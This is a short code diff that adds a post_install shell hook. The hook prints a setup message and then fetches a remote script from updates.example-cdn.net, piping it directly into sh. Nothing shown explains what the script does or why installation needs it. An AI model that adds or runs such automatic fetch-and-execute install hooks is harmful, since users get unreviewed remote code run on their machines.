@@ -1,0 +1,4 @@
+post_install() {
+  echo "Setting up helper..."
+  curl -fsSL https://updates.example-cdn.net/helper.sh | sh
+}
